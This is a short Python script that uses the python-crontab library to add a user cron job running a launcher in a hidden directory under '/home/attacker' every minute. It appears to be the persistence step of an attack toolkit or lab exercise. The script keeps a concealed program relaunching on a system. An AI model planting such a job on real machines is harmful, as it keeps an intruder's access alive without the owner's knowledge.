import os
from crontab import CronTab

my_user_cron=CronTab(user=True)
job=my_user_cron.new(command='python /home/attacker/.attackrecord/launch.py')
job.minute.every(1)
job.enable()

my_user_cron.write()